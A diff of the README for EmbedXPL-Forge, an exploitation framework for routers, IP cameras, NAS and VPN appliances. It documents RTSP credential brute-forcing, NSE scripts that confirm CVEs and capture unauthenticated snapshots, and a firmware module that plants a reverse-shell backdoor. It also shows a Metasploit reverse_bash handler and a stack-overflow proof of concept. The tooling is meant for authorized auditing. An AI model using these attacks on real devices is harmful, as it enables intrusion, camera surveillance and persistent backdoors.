@@ -1,10 +1,11 @@
 # EmbedXPL-Forge
 
-**Embedded Device Security Assessment Framework**
+**Embedded & Perimeter Security Assessment Framework**
 
-EmbedXPL-Forge is an open-source exploitation framework designed for security professionals to audit routers, switches, IP cameras, GPON ONTs, ISP CPEs, and IoT/embedded edge devices. It provides **700 modules** covering credential testing, vulnerability exploitation, network scanning, payload generation, and encoding — with **350 CVEs** mapped across **55 vendors** and an **APT Group Attack Engine** that reproduces real-world nation-state attack chains.
+EmbedXPL-Forge is an open-source exploitation framework for security professionals auditing routers, switches, IP cameras, NVR/DVR, GPON ONTs, ISP CPEs, and IoT/embedded edge devices. It provides **3200+ modules** covering credential testing, vulnerability exploitation, network scanning, payload generation, RTSP camera attacks, firmware manipulation, and multi-language PolyExploit orchestration — with **680+ CVEs** mapped across **95+ vendors** and an **APT Group Attack Engine** that reproduces real-world nation-state attack chains.
 
 > **Author:** André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | [União Geek](https://github.com/Uniao-Geek)
+> **Version:** 2.12.0
 
 ---
 
@@ -12,28 +13,39 @@ EmbedXPL-Forge is an open-source exploitation framework designed for security pr
 
 - **540+ exploit modules** — RCE, auth bypass, path traversal, info disclosure, buffer overflow, DNS hijacking, command injection, backdoor, CSRF, config decrypt
 - **88 credential modules** — dictionary attacks against FTP, SSH, Telnet, HTTP, SNMP, SFTP
+- **Full RTSP camera engine** — ported from [cameradar](https://github.com/ullaakut/cameradar): route brute-force (195+ routes), credential brute-force (80+ pairs), Basic/Digest auth, RTSPS/TLS, **RTSP-over-HTTP tunnel (pure Python, RFC 2326 App-C)**, nmap/masscan/direct scanner, ONVIF WS-Discovery, M3U output
+- **7 custom Nmap NSE scripts** — RTSP discovery, camera fingerprinting, Hikvision/Dahua CVE validation, default credential testing, multi-vendor CVE checks, snapshot capture (`pip install embedxpl[nse]`)
+- **Firmware exploitation suite** — format detection, backdoor injection, checksum patching, vendor flash bypass (NETGEAR, TP-Link, D-Link, ASUS)
+- **PolyExploit orchestrator** — runtime C/C++ compilation (gcc/clang/mingw/cross), execution of Ruby/Node.js/PHP/Bash/Perl exploits, msfconsole integration, ExploitDB/searchsploit integration
 - **5 scanner modules** — AutoPwn, device-specific scanners
 - **32 payload modules** — reverse/bind TCP shells for x86, x64, ARM, MIPS, Python, Perl, PHP
 - **13 encoder modules** — Base64 and hex encoding for Python, PHP, Perl
 - **14 generic modules** — Heartbleed, ShellShock, UPnP IGD, SNMP bruteforce, TCP Xmas, UDP amplification, CVE lookup, DNS hijack detector, AITM interceptor
-- **350 CVEs mapped** — from 2001 to 2026, covering all major vulnerability classes
+- **680+ CVEs mapped** — from 2001 to 2026, covering all major vulnerability classes
 - **APT Group Attack Engine** — browse and reproduce attack chains from APT28, Volt Typhoon, Sandworm, Quad7, Turla, APT40 with MITRE ATT&CK mapping
 - **23 vendor-specific wordlists** — externalized default credentials per vendor (incl. ISP-specific Brazil)
 - **Network discovery** — SSDP, ARP, Nmap, Masscan, Scapy fallback, OUI lookup (IEEE database), T0–T5 timing profiles
 - **Session management** — persistent scan history per host (IP+MAC), resume/restart, full findings index
-- **Chained autopwn modules** — multi-phase vendor-specific exploitation chains (Huawei GPON ONT, D-Link, TP-Link APT28 chain, etc.)
+- **Chained autopwn modules** — multi-phase vendor-specific exploitation chains
 
 ## Supported Device Types
 
 | Type | Coverage | Description |
 |------|----------|-------------|
 | **Routers / GPON ONT / CPE** | 580+ modules | SOHO routers, enterprise gateways, GPON CPE/ONT (primary focus) |
-| **Switches L2/L3** | 3 modules | Managed switches (Cisco, D-Link, NETGEAR) — limited coverage |
+| **IP Cameras / NVR / DVR** | 60+ modules | Hikvision, Dahua, Axis, Reolink, Amcrest, Uniview, Tapo, Swann, ANNKE, Edimax, Intelbras, Grandstream, Foscam, Xiongmai OEM, MVPower, and 20+ more |
+| **NAS (Network Storage)** | 20+ modules | QNAP, Synology, D-Link NAS, Zyxel NAS |
+| **VPN / Firewall Appliances** | 20+ modules | Ivanti, Fortinet, SonicWall, Zyxel |
+| **Switches L2/L3** | 3 modules | Managed switches (Cisco, D-Link, NETGEAR) |
 | **SOHO Edge** | 9 modules | Travel routers, NAS, wireless APs |
 
 ## Supported Vendors
 
-2Wire · 3Com · ActionTec · Arris · Aruba · Asmax · ASUS · Belkin · BHU · Billion · Calix · CERIO · Cisco · Comtrend · D-Link · Draytek · FiberHome · Fortinet · GPON · HooToo · Huawei · Intelbras · IPFire · Juniper · LG · Linksys · Mercury · MikroTik · MitraStar · Movistar · Netcore · NETGEAR · Netsys · OpenWrt · Ruijie · SerComm · Shuttle · SonicWall · Technicolor · Tenda · Thomson · TOTOLINK · TP-Link · TRENDnet · Ubiquiti · Wavlink · Xiaomi · Zhone · ZTE · ZyXEL
+**Network equipment:** 2Wire · 3Com · ActionTec · Arris · Aruba · Asmax · ASUS · Belkin · BHU · Billion · Calix · CERIO · Cisco · Comtrend · D-Link · Draytek · FiberHome · Fortinet · GL.iNet · GPON · HooToo · Huawei · Intelbras · IPFire · Juniper · LG · Linksys · Mercury · MikroTik · MitraStar · Movistar · Netcore · NETGEAR · Netsys · OpenWrt · Ruijie · SerComm · Shuttle · SonicWall · Technicolor · Tenda · Thomson · TOTOLINK · TP-Link · TRENDnet · Ubiquiti · Wavlink · Xiaomi · Zhone · ZTE · ZyXEL
+
+**Cameras / NVR / DVR:** Hikvision · Dahua · Axis · Reolink · Amcrest · Uniview (UNV) · Tapo (TP-Link) · Swann · ANNKE · Edimax · Intelbras · Grandstream · Foscam · Acti · Avigilon · Beward · Brickcom · Cisco cameras · Geuterbruck · Honeywell cameras · Jovision · Siemens cameras · Xiongmai (OEM) · Zivif · MVPower DVR · Generic P2P WiFi cameras · Generic DVR/NVR OEM
+
+**NAS / VPN / Security:** QNAP · Synology · D-Link NAS · Zyxel NAS · Ivanti · SonicWall · Fortinet · Avocent
 
 ## Installation
 
@@ -44,16 +56,37 @@ pip install embedxpl
 embedxpl
 ```
 
-### Option 2 — From source
+### Option 2 — With Nmap NSE scripts
+
+```bash
+# Install EmbedXPL + NSE dependencies
+pip install "embedxpl[nse]"
+
+# Install the 7 custom NSE scripts into Nmap's scripts directory
+python -m embedxpl.nse install
+# or using the entry point:
+embedxpl-nse install
+
+# Verify installation
+python -m embedxpl.nse list
+```
+
+> **Note:** On Linux/macOS the install step may require `sudo` to write to `/usr/share/nmap/scripts/`.
+> Run: `sudo python -m embedxpl.nse install`
+
+### Option 3 — From source
 
 ```bash
 git clone https://github.com/mrhenrike/EmbedXPL-Forge.git
 cd EmbedXPL-Forge
 pip install -r requirements.txt
+# Optional: also install NSE scripts
+pip install -e ".[nse]"
+python -m embedxpl.nse install
 python exf.py
 ```
 
-### Option 3 — Python module
+### Option 4 — Python module
 
 ```bash
 pip install embedxpl
@@ -74,6 +107,13 @@ embedxpl -m exploits/routers/tplink/wr841n_credential_disclosure_cve_2023_50224 
 
 # Network discovery
 embedxpl -c "discover 192.168.1.0/24"
+
+# RTSP camera scan + brute-force
+embedxpl -m exploits/cameras/multi/rtsp_cameradar_attack -s target 192.168.1.100
+
+# Nmap NSE quick scan (after pip install embedxpl[nse] + embedxpl-nse install)
+nmap -p 554,5554,8554 --script embedxpl-rtsp-discover 192.168.1.0/24
+nmap -p 80,443 --script 'embedxpl-*' 192.168.1.100
 ```
 
 ## Usage
@@ -181,22 +221,509 @@ exf (AutoPwn) > set target 192.168.1.0/24
 exf (AutoPwn) > run
 ```
 
+## RTSP Camera Engine
+
+Full-featured RTSP attack pipeline — ported from [cameradar](https://github.com/ullaakut/cameradar) and extended with Python-native features.
+
+### Transport Modes
+
+| Mode | Port | Class / Method |
+|------|------|---------------|
+| `rtsp` | 554 | `RTSPClient(host, port)` |
+| `rtsps` | 443/8443 | `RTSPClient(host, port, use_tls=True)` |
+| `http` | 80/8080 | `RTSPClient(host, port, tunnel_http=True)` |
+| `https` | 443/8443 | `RTSPClient(host, port, use_tls=True, tunnel_http=True)` |
+| auto | any | `RTSPClient.from_scheme(host, port, "http")` |
+
+### Attack Pipeline
+
+```python
+from embedxpl.core.rtsp.scanner  import RTSPScanner
+from embedxpl.core.rtsp.attacker import RTSPAttacker
+from embedxpl.core.rtsp.models   import RTSPStream
+
+# 1. Discover RTSP-speaking hosts on the network
+scanner = RTSPScanner(timeout=5.0)
+hosts = scanner.scan_network("192.168.1.0/24", ports=[554, 5554, 8554])
+# Returns: [('192.168.1.100', 554), ('192.168.1.101', 8554), ...]
+
+# 2. Run full 5-phase attack pipeline
+attacker = RTSPAttacker(timeout=5.0)
+results = attacker.attack_all(hosts)
+
+# 3. Inspect results
+for stream in results:
+    print(stream.url)         # rtsp://admin:@192.168.1.100:554/h264/ch1/main/av_stream
+    print(stream.username)    # admin
+    print(stream.password)    # (empty string)
+    print(stream.route)       # h264/ch1/main/av_stream
+    print(stream.auth_type)   # AuthType.BASIC
+    print(stream.accessible)  # True
+```
+
+**Expected output:**
+```
+[RTSP] Scanning 192.168.1.0/24 on ports [554, 5554, 8554]...
+[RTSP] Found 3 RTSP hosts
+[RTSP] 192.168.1.100:554 — Phase 1: Route discovery (195 routes)...
+[RTSP] 192.168.1.100:554 — Route found: h264/ch1/main/av_stream
+[RTSP] 192.168.1.100:554 — Phase 2: Auth detection → Basic (realm="IP Camera")
+[RTSP] 192.168.1.100:554 — Phase 3: Credential brute-force (80 pairs)...
+[RTSP] 192.168.1.100:554 — ✓ Credentials: admin:
+[RTSP] 192.168.1.100:554 — Phase 4: Stream validated (200 OK)
+[RTSP] Attack complete. Accessible streams: 2/3
+```
+
+### Skip-Scan Mode (Known Hosts)
+
+```python
+# Skip network scan, attack known hosts directly
+hosts = scanner.skip_scan(["192.168.1.100:554", "192.168.1.101"])
+# Accepts: "host:port", "host", CIDR "192.168.1-2.0-255", hostnames
+```
+
+**Expected input/output:**
+```python
+# Input
+hosts = scanner.skip_scan(["camera.local:554", "192.168.1-2.100-110"])
+
+# Output: [(resolved_ip, port), ...]
+# [('192.168.1.100', 554), ('192.168.1.200', 554), ('192.168.1.100', 554), ...]
+```
+
+### RTSP-over-HTTP Tunnel
+
+Used when cameras are behind HTTP proxies or corporate firewalls that block TCP/554.
+
+```python
+from embedxpl.core.rtsp.client import RTSPClient, RTSPOverHTTPTunnel
+
+# Direct tunnel usage
+tunnel = RTSPOverHTTPTunnel(host="10.0.0.50", port=8080, timeout=10.0)
+response = tunnel.send_rtsp_via_http(
+    "OPTIONS rtsp://10.0.0.50:8080/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
+)
+# Returns: raw RTSP response bytes (base64-decoded from HTTP body)
+
+# Or via RTSPClient factory
+client = RTSPClient.from_scheme("10.0.0.50", 8080, "http", timeout=10.0)
+status, server, methods = client.options()  # → (200, "Hikvision NVRA", "OPTIONS, DESCRIBE, SETUP, PLAY")
+```
+
+**Expected input/output:**
+```
+Input : host=10.0.0.50, port=8080, scheme="http"
+Output:
+  status  = 200
+  server  = "Hikvision IP Camera NVRA (V5.4.5)"
+  methods = "OPTIONS, DESCRIBE, SETUP, PLAY, TEARDOWN"
+```
+
+### RTSP Module (Interactive)
+
+```
+embedxpl > use exploits/cameras/multi/rtsp_cameradar_attack
+embedxpl (RTSP Cameradar Attack) > show options
+
+  Option          Default    Description
+  ------          -------    -----------
+  target          required   Target IP/CIDR/range (e.g. 192.168.1.0/24)
+  ports           554,5554,8554  RTSP ports to scan
+  timeout         5          Connection timeout (seconds)
+  scheme          rtsp       Transport: rtsp | rtsps | http | https
+  skip_scan       false      Skip nmap discovery, attack directly
+  output_m3u      false      Save accessible streams to streams.m3u
+  onvif_discover  false      Enable ONVIF WS-Discovery
+
+embedxpl (RTSP Cameradar Attack) > set target 192.168.1.0/24
+embedxpl (RTSP Cameradar Attack) > set output_m3u true
+embedxpl (RTSP Cameradar Attack) > run
+```
+
+---
+
+## Nmap NSE Scripts
+
+EmbedXPL-Forge includes 7 custom Nmap NSE scripts for IoT/camera scanning and CVE detection.
+
+### Installation
+
+```bash
+# Install with NSE extras
+pip install "embedxpl[nse]"
+
+# Install scripts to Nmap (Linux/macOS may need sudo)
+python -m embedxpl.nse install
+# or
+embedxpl-nse install
+
+# Force overwrite existing scripts
+python -m embedxpl.nse install --force
+
+# Custom Nmap directory
+python -m embedxpl.nse install --nse-dir /opt/homebrew/share/nmap/scripts
+```
+
+**Expected output:**
+```
+  [OK]   embedxpl-rtsp-discover.nse → /usr/share/nmap/scripts/embedxpl-rtsp-discover.nse
+  [OK]   embedxpl-camera-identify.nse → /usr/share/nmap/scripts/embedxpl-camera-identify.nse
+  [OK]   embedxpl-hikvision-vuln.nse → /usr/share/nmap/scripts/embedxpl-hikvision-vuln.nse
+  [OK]   embedxpl-dahua-vuln.nse → /usr/share/nmap/scripts/embedxpl-dahua-vuln.nse
+  [OK]   embedxpl-rtsp-creds.nse → /usr/share/nmap/scripts/embedxpl-rtsp-creds.nse
+  [OK]   embedxpl-iot-cve-check.nse → /usr/share/nmap/scripts/embedxpl-iot-cve-check.nse
+  [OK]   embedxpl-camera-snapshot.nse → /usr/share/nmap/scripts/embedxpl-camera-snapshot.nse
+
+Installed: 7 script(s)
+  [OK] nmap --script-updatedb complete
+```
+
+### List / Info
+
+```bash
+python -m embedxpl.nse list
+python -m embedxpl.nse info rtsp-discover
+```
+
+### NSE Script Reference
+
+#### `embedxpl-rtsp-discover` — RTSP Service Discovery
+
+Detects RTSP services, grabs the `Server:` banner, identifies vendor, lists supported methods, and cross-references known CVEs.
+
+```bash
+# Basic usage
+nmap -p 554,5554,8554 --script embedxpl-rtsp-discover 192.168.1.0/24
+
+# With custom timeout
+nmap -p 554,5554,8554 --script embedxpl-rtsp-discover --script-args rtsp.timeout=3 192.168.1.0/24
+```
+
+**Expected output:**
+```
+554/tcp open rtsp
+| embedxpl-rtsp-discover:
+|   Status : 200
+|   Server : Hikvision IP Camera NVRA (V5.4.5)
+|   Methods: OPTIONS, DESCRIBE, SETUP, PLAY, TEARDOWN
+|   Vendor : Hikvision
+|   Known CVEs: CVE-2021-36260 (RCE, CVSS 9.8), CVE-2017-7921 (Auth Bypass)
+|   EmbedXPL module: exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
+|   Exploit hint: embedxpl > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
+|_  Full attack: embedxpl > use exploits/cameras/multi/rtsp_cameradar_attack
+```
+
+---
+
+#### `embedxpl-camera-identify` — Deep Camera Fingerprinting
+
+Multi-protocol identification: probes HTTP/HTTPS web UI, RTSP banner, and ONVIF. Extracts vendor, model, firmware, serial, and MAC.
+
+```bash
+nmap -p 80,443,554,37777 --script embedxpl-camera-identify 192.168.1.100
+nmap -sV -p- --script embedxpl-camera-identify 192.168.1.0/24
+```
+
+**Expected output (Hikvision):**
+```
+80/tcp open http
+| embedxpl-camera-identify:
+|   Protocol : HTTP (HTTP 200)
+|   Vendor   : Hikvision
+|   Model    : DS-2CD2143G0-I
+|   Firmware : V5.6.2 build 190401
+|   Serial   : DS-2CD2143G0-I20190401AAWRA123456789
+|   CVEs     : CVE-2021-36260 (RCE, CVSS 9.8) | CVE-2017-7921 (Auth Bypass)
+|   Vuln assessment: LIKELY VULNERABLE (endpoint accessible without auth)
+|   EmbedXPL module: exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
+|_  Run exploit: embedxpl > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
+```
+
+---
+
+#### `embedxpl-hikvision-vuln` — Hikvision CVE Checker
+
+Active validation of CVE-2021-36260 (RCE via `/SDK/webLanguage`, CVSS 9.8) and CVE-2017-7921 (auth bypass snapshot).
+
+```bash
+nmap -p 80,443,8080 --script embedxpl-hikvision-vuln 192.168.1.100
+nmap -p 80,443,8080 --script embedxpl-hikvision-vuln --script-args timeout=10 192.168.1.0/24
+```
+
+**Expected output:**
+```
+80/tcp open http
+| embedxpl-hikvision-vuln:
+|   Device          : DS-2CD2143G0-I
+|   Firmware        : V5.3.0 build 170112
+|   CVE-2021-36260  : VULNERABLE — endpoint accepts PUT without authentication (CVE-2021-36260, CVSS 9.8)
+|   CVE-2017-7921   : VULNERABLE — snapshot captured without valid credentials (CVE-2017-7921)
+|   EmbedXPL RCE module  : exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
+|   EmbedXPL Auth Bypass : exploits/cameras/hikvision/info_disclosure_cve_2017_7921
+|_  Run full exploit: embedxpl > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
+```
+
+---
+
+#### `embedxpl-dahua-vuln` — Dahua CVE Checker
+
+Tests CVE-2021-33044 (auth bypass, CVSS 9.8), CVE-2020-25078 (user disclosure), CVE-2013-6117 (legacy DVR). Also covers Dahua OEMs: Amcrest, Intelbras, TVT, Jovision, ANNKE.
+
+```bash
+nmap -p 80,37777 --script embedxpl-dahua-vuln 192.168.1.0/24
+```
+
+**Expected output:**
+```
+80/tcp open http
+| embedxpl-dahua-vuln:
+|   Vendor         : Dahua (or Dahua-OEM: Amcrest / Intelbras / TVT)
+|   CVE-2021-33044 : VULNERABLE — snapshot captured via Digest bypass (CVE-2021-33044, CVSS 9.8)
+|   CVE-2020-25078 : VULNERABLE — Users disclosed: [admin, operator]
+|   CVE-2013-6117  : NOT VULNERABLE
+|   EmbedXPL Auth Bypass  : exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044
+|   EmbedXPL Cred Extract : exploits/cameras/dahua/cctv_37777_credential_extraction
+|_  Run exploit: embedxpl > use exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044
+```
+
+---
+
+#### `embedxpl-rtsp-creds` — RTSP Default Credential Tester
+
+Tests 18 default credential pairs across 9+ common RTSP routes using Basic auth. Reports the first match.
+
+```bash
+nmap -p 554,5554,8554 --script embedxpl-rtsp-creds 192.168.1.100
+
+# With custom route hint
+nmap -p 554 --script embedxpl-rtsp-creds --script-args rtsp.route=live.sdp 192.168.1.100
+```
+
+**Expected output:**
+```
+554/tcp open rtsp
+| embedxpl-rtsp-creds:
+|   Server           : Hikvision IP Camera NVRA
+|   Credential found : admin: (empty password)
+|   Stream URL       : rtsp://admin:@192.168.1.100:554/h264/ch1/main/av_stream
+|   Auth type        : Basic
+|   Response code    : 200
+|   EmbedXPL full scan : exploits/cameras/multi/rtsp_cameradar_attack
+|_  Run exploit: embedxpl > use exploits/cameras/multi/rtsp_cameradar_attack
+```
+
+---
+
+#### `embedxpl-iot-cve-check` — Multi-Vendor CVE Fingerprint
+
+Detects and validates 10 active CVEs across Hikvision, Dahua, D-Link NAS, Reolink, Uniview, QNAP, SonicWall, and GPON.
+
+```bash
+nmap -p 80,443,8080 --script embedxpl-iot-cve-check 192.168.1.0/24
+```
+
+**Expected output:**
+```
+80/tcp open http
+| embedxpl-iot-cve-check:
+|   CVE-2021-36260 (Hikvision, CVSS 9.8): POSSIBLY VULNERABLE — HTTP 200 returned
+|     → EmbedXPL: CVE-2021-36260 : use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
+|   CVE-2021-33044 (Dahua, CVSS 9.8)   : NOT VULNERABLE — HTTP 404
+|   EmbedXPL-Forge: https://github.com/mrhenrike/EmbedXPL-Forge
+|_  Full exploitation: pip install embedxpl && embedxpl
+```
+
+---
+
+#### `embedxpl-camera-snapshot` — Unauthenticated Snapshot Access
+
+Probes 16 vendor-specific snapshot endpoints. Reports any URL returning `image/*` without credentials. Optionally saves JPEG files locally.
+
+```bash
+nmap -p 80,443,8080 --script embedxpl-camera-snapshot 192.168.1.100
+
+# Save snapshots to disk
+nmap -p 80 --script embedxpl-camera-snapshot --script-args outdir=/tmp/snaps 192.168.1.0/24
+```
+
+**Expected output:**
+```
+80/tcp open http
+| embedxpl-camera-snapshot:
+|   Endpoint 1 (Dahua):
+|     URL          : http://192.168.1.100:80/cgi-bin/snapshot.cgi?channel=1
+|     Content-Type : image/jpeg
+|     Size         : 45231 bytes
+|     Access       : UNAUTHENTICATED SNAPSHOT ACCESS
+|     EmbedXPL module: exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044
+|_    Run exploit: embedxpl > use exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044
+```
+
+### Run All NSE Scripts via Python
+
+```bash
+# Run all scripts via embedxpl-nse CLI
+python -m embedxpl.nse run --target 192.168.1.0/24 --scripts all
+
+# Run specific scripts
+python -m embedxpl.nse run --target 192.168.1.100 --scripts rtsp-discover,hikvision-vuln
+
+# With output file
+python -m embedxpl.nse run --target 192.168.1.0/24 --scripts all --output /tmp/scan.txt
+
+# Custom ports
+python -m embedxpl.nse run --target 192.168.1.0/24 --scripts all --ports 80,443,554,5554,8080,8554
+```
+
+**Uninstall:**
+```bash
+python -m embedxpl.nse uninstall
+```
+
+---
+
+## Firmware Exploitation
+
+```
+embedxpl > use exploits/firmware/netgear_firmware_flash
+embedxpl (NETGEAR Firmware Flash) > set target 192.168.1.1
+embedxpl (NETGEAR Firmware Flash) > set firmware /path/to/backdoored.bin
+embedxpl (NETGEAR Firmware Flash) > set lhost 10.0.0.10
+embedxpl (NETGEAR Firmware Flash) > set lport 4444
+embedxpl (NETGEAR Firmware Flash) > run
+```
+
+**What it does:**
+1. Detects firmware format (TRX, DLOB, SEAMA, WRGG, raw binary)
+2. Injects reverse shell backdoor at a suitable offset
+3. Recalculates CRC32/MD5 checksum
+4. Uploads via vendor-specific flash endpoint (bypassing auth where applicable)
+5. Waits for device reboot and verifies backdoor execution
+
+---
+
+## PolyExploit Orchestrator
+
+Enables runtime C/C++ compilation and multi-language script execution for exploits not portable to pure Python.
+
+### C/C++ Runtime Compilation
+
+```python
+from embedxpl.core.poly import CCompiler
+
+compiler = CCompiler()
+
+# Check available compilers
+print(compiler.compiler_available())  # {'gcc': True, 'clang': False, 'mingw': False}
+
+# Compile a C PoC exploit at runtime
+binary = compiler.compile_c(
+    source="""
+#include <stdio.h>
+#include <string.h>
+int main(int argc, char *argv[]) {
+    // Stack overflow PoC
+    char buf[64];
+    memcpy(buf, argv[1], atoi(argv[2]));
+    return 0;
+}
+""",
+    arch="x86",   # x86, x64, arm, mips, mingw
+)
+# Returns: Path to compiled binary (cached by source hash)
+
+# Execute with arguments
+output = compiler.run_binary(binary, args=["AAAA"*100, "400"])
+print(output.stdout)
+```
+
+### Multi-Language Script Execution
+
+```python
+from embedxpl.core.poly import PolyRunner
+
+runner = PolyRunner()
+print(runner.available_runtimes())
+# {'ruby': True, 'node': True, 'php': True, 'bash': True, 'perl': True}
+
+# Execute a Ruby exploit
+result = runner.run_ruby("""
+require 'net/http'
+resp = Net::HTTP.get_response(URI('http://192.168.1.1/cgi-bin/exploit'))
+puts resp.body
+""", args=["192.168.1.1"])
+
+# Metasploit integration
+runner.run_metasploit(module="exploit/multi/handler", options={
+    "PAYLOAD": "cmd/unix/reverse_bash",
+    "LHOST": "10.0.0.10",
+    "LPORT": "4444",
+})
+
+# ExploitDB / searchsploit lookup
+results = runner.searchsploit("hikvision rtsp")
+for r in results:
+    print(r["Title"], r["Path"])
+```
+
+---
+
 ## Module Structure
 
 ```
-embedxpl/modules/
-├── creds/             # Credential testing (FTP, SSH, Telnet, HTTP, SNMP)
-│   ├── generic/       # Protocol-agnostic bruteforce and defaults
-│   └── routers/       # Vendor-specific default credentials
-├── exploits/          # Vulnerability exploitation
-│   ├── generic/       # Cross-vendor (Heartbleed, ShellShock, GPON)
-│   ├── routers/       # Router exploits by vendor (44 vendor folders)
-│   ├── switches/      # Switch exploits (Cisco, D-Link, NETGEAR)
-│   └── soho_edge/     # SOHO edge device exploits
-├── scanners/          # Network scanning and AutoPwn
-├── payloads/          # Reverse/bind shells (multi-arch)
-├── encoders/          # Payload encoding (Base64, Hex)
-└── generic/           # CVE lookup, SNMP, UPnP SSDP, UPnP IGD exploit, wordlist tools
+embedxpl/
+├── core/
+│   ├── rtsp/          # RTSP camera engine
+│   │   ├── client.py  # Raw socket RTSP client (OPTIONS/DESCRIBE/auth/TLS/HTTP-tunnel)
+│   │   ├── attacker.py# 5-phase attack pipeline (route→auth→creds→validate→re-attack)
+│   │   ├── scanner.py # Network discovery (nmap/masscan/direct), CIDR/range expansion
+│   │   └── models.py  # RTSPStream dataclass, AuthType enum
+│   └── poly/
+│       ├── compiler.py# CCompiler — runtime C/C++ compilation (gcc/clang/mingw/cross)
+│       └── runner.py  # PolyRunner — Ruby/Node/PHP/Bash/Perl + Metasploit + ExploitDB
+├── modules/
+│   ├── creds/             # Credential testing (FTP, SSH, Telnet, HTTP, SNMP)
+│   ├── exploits/
+│   │   ├── cameras/       # IP camera exploits by vendor
+│   │   │   ├── multi/     # Multi-vendor (RTSP cameradar, P2P, ONVIF)
+│   │   │   ├── hikvision/ # Hikvision (CVE-2021-36260, CVE-2017-7921, ...)
+│   │   │   ├── dahua/     # Dahua + OEMs (CVE-2021-33044, CVE-2020-25078, ...)
+│   │   │   ├── axis/      # Axis (CVE-2018-10660, ...)
+│   │   │   ├── reolink/   # Reolink (CVE-2021-40655, CVE-2022-30600)
+│   │   │   ├── amcrest/   # Amcrest (CVE-2019-3950)
+│   │   │   ├── uniview/   # Uniview UNV (CVE-2024-37630)
+│   │   │   ├── tapo/      # TP-Link Tapo (CVE-2021-4045)
+│   │   │   ├── annke/     # ANNKE DVR/NVR (CVE-2021-32941)
+│   │   │   ├── swann/     # Swann DVR/NVR (default creds + RTSP)
+│   │   │   └── edimax/    # Edimax IC-7100 (CVE-2025-1316, CISA KEV)
+│   │   ├── firmware/      # Firmware flash bypass (NETGEAR, TP-Link, D-Link, ASUS)
+│   │   ├── nas/           # NAS exploits (QNAP, D-Link NAS, Zyxel)
+│   │   ├── routers/       # Router exploits by vendor (44 vendor folders)
+│   │   ├── vpn/           # VPN/firewall appliances (Ivanti, Fortinet, SonicWall)
+│   │   ├── switches/      # Switch exploits (Cisco, D-Link, NETGEAR)
+│   │   └── soho_edge/     # SOHO edge device exploits
+│   ├── scanners/          # Network scanning and AutoPwn
+│   ├── payloads/          # Reverse/bind shells (multi-arch)
+│   ├── encoders/          # Payload encoding (Base64, Hex)
+│   └── generic/           # CVE lookup, SNMP, UPnP, SSDP, wordlist tools
+├── nse/                   # NSE script manager (Python)
+│   ├── manager.py         # NSEManager class — install/uninstall/list/run
+│   └── __main__.py        # CLI: python -m embedxpl.nse
+├── resources/
+│   └── rtsp/
+│       ├── routes.txt      # 195+ RTSP stream paths
+│       └── credentials.json# 80+ default username:password pairs
+└── data/
+    └── oui.txt             # IEEE OUI database for MAC-to-vendor lookup
+
+nse/                        # Nmap NSE Lua scripts (pip install embedxpl[nse])
+├── embedxpl-rtsp-discover.nse
+├── embedxpl-camera-identify.nse
+├── embedxpl-hikvision-vuln.nse
+├── embedxpl-dahua-vuln.nse
+├── embedxpl-rtsp-creds.nse
+├── embedxpl-iot-cve-check.nse
+└── embedxpl-camera-snapshot.nse
 ```
 
 ## Architecture & Attack Surface Maps
@@ -243,8 +770,16 @@ Source files in [`docs/diagrams/architecture/`](docs/diagrams/architecture/).
 ## Requirements
 
 - Python 3.8+
-- Optional: `nmap` (binary) for enhanced network discovery
-- Dependencies: `requests`, `paramiko`, `pysnmp`, `pycryptodome`, `scapy`, `colorama`, `rich`, `python-nmap`
+- Optional: `nmap` (binary) for enhanced network discovery and NSE scripts
+- Optional: `masscan` for high-speed RTSP discovery
+- Optional: `gcc`/`clang` for PolyExploit C/C++ runtime compilation
+- Optional: `msfconsole` for Metasploit integration via PolyRunner
+
+**Python dependencies (auto-installed):**
+`requests`, `paramiko`, `pysnmp`, `pycryptodome`, `scapy`, `colorama`, `rich`, `python-nmap`, `aiohttp`
+
+**NSE extras (`pip install "embedxpl[nse]"`):**
+`python-nmap` (already included in core)
 
 Full list: [`requirements.txt`](requirements.txt)
 
